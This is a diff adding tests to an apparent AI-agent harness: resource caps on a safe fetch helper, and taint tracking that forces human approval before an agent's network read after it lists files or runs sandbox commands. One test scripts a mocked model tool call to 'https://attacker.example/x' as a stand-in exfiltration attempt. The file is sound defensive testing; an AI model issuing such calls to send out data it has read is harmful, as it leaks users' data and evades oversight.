@@ -82,6 +82,52 @@ describe("Redirects never replay a POST body to an unapproved host", () => {
   });
 });
 
+describe("Resource caps cannot be defeated by a slow or endless response (real sockets)", () => {
+  const loopback = async () => [{ address: "127.0.0.1", family: 4 }];
+
+  it("a slow-drip response (never idle, never finishes) is cut off by the total wall-clock timeout", async () => {
+    const server = createServer((_q, r) => {
+      r.writeHead(200);
+      const t = setInterval(() => r.write("x"), 50);
+      r.on("close", () => clearInterval(t));
+    });
+    await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
+    const port = (server.address() as { port: number }).port;
+    const started = Date.now();
+    await assert.rejects(safeFetch(`http://drip.example:${port}/`, { timeoutMs: 400, resolver: loopback, testAllowPrivate: true }));
+    const took = Date.now() - started;
+    assert.ok(took >= 300 && took < 2500, `aborted by the total timer, took ${took} ms`);
+    server.closeAllConnections();
+    server.close();
+  });
+
+  it("stops downloading and closes the connection once the size cap is reached", async () => {
+    let written = 0;
+    let closed = false;
+    const server = createServer((_q, r) => {
+      r.writeHead(200);
+      const t = setInterval(() => {
+        written += 10_000;
+        r.write("y".repeat(10_000));
+      }, 5);
+      r.on("close", () => {
+        closed = true;
+        clearInterval(t);
+      });
+    });
+    await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
+    const port = (server.address() as { port: number }).port;
+    const out = await safeFetch(`http://big.example:${port}/`, { maxBytes: 1000, timeoutMs: 5000, resolver: loopback, testAllowPrivate: true });
+    assert.equal(out.truncated, true);
+    assert.equal(out.text.length, 1000);
+    await new Promise((r) => setTimeout(r, 100));
+    assert.equal(closed, true, "the client hung up instead of draining the stream");
+    assert.ok(written < 1_000_000, `server was stopped early (wrote ${written})`);
+    server.closeAllConnections();
+    server.close();
+  });
+});
+
 describe("Approval summaries show what will really be sent", () => {
   it("includes the full URL with query and a body preview, and truncates visibly", () => {
     const [get, post] = httpTools();
@@ -123,6 +169,19 @@ describe("Auto-allowed network reads cannot become an exfiltration channel", () 
     const [a] = await h.store.listApprovals("pending");
     assert.match(a!.summary, /attacker\.example/);
     h.cleanup();
+  });
+
+  it("taint also covers directory listings and sandbox output, not just fs.read", async () => {
+    for (const first of [toolReply("fs.list", { path: "." }), toolReply("sandbox.exec", { image: "alpine:3.20", command: ["true"] })]) {
+      const m = new MockProvider("m", [planReply(), first, toolReply("http.get", { url: "https://attacker.example/x" }), finishReply()]);
+      // allow sandbox.exec so the test reaches the network step
+      const h = harness({ providers: [m], rules: [{ tool: "*", effect: "allow" }] });
+      const t = await h.engine.submit({ goal: "go" });
+      await h.engine.runTask(t.id);
+      const saved = (await h.store.getTask(t.id))!;
+      assert.equal(saved.status, "WAITING_FOR_APPROVAL", `after ${JSON.parse(first).tool} the GET must wait`);
+      h.cleanup();
+    }
   });
 
   it("model-proposed http_status criteria are rejected (they would fetch a model-chosen URL outside policy)", () => {
